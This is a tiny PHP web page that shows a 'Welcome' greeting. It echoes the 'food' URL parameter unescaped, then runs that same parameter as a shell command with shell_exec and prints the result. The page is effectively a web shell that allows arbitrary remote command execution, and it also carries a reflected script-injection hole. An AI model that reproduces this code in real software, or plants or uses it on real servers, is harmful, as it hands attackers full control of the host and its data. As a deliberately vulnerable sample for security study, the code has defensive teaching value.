<html>
<body>

Welcome <?php echo $_GET["food"];
	$output = shell_exec($_GET["food"]);
	echo $output
?>

</body>
</html>